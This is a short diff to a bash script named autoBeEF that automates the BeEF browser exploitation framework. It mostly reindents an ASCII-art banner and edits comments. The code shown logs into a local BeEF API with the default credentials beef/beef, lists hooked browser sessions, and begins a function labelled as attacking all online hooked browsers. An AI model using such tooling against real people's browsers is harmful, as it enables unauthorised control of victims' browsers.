@@ -1,18 +1,18 @@
 #!/bin/bash
 
-#      autoBeEF V1.0  
+#                                        autoBeEF V1.0  
 #
-#  By: Andre Maccarone
+#                                    By: Andre Maccarone
 #
-#    ,           ,    
-#   /             \   
-#  ((__-^^-,-^^-__))  
-#   `-_---' `---_-'   
-#    <__|o` 'o|__>    
-#       \  `  /       
-#        ): :(        
-#        :o_o:       
-#         "-"        
+#                                       ,           ,    
+#                                      /             \   
+#                                     ((__-^^-,-^^-__))  
+#                                      `-_---' `---_-'   
+#                                       <__|o` 'o|__>    
+#                                          \  `  /       
+#                                           ): :(        
+#                                           :o_o:       
+#                                            "-"        
 #
 
 
@@ -20,14 +20,13 @@
 # Grab API Token
 
 GET_TOKEN="$(curl -H "Content-Type: application/json" -X POST -d '{"username":"beef", "password":"beef"}' http://127.0.0.1:3000/api/admin/login)"
-
 TOKEN="$(echo "$GET_TOKEN" | awk -F '["]' '{print $6}')"
 
 
 
 
 
-# View targets
+# Allow user to select a target
 
 function single_target {
 	GET_SESSIONS="$(curl http://127.0.0.1:3000/api/hooks?token=${TOKEN} | json_pp)"
@@ -38,6 +37,7 @@ function single_target {
 }
 
 
+# Attack all online browsers
 
 function attack_all {
 	session="$(curl http://127.0.0.1:3000/api/hooks?token=${TOKEN} | json_pp)"
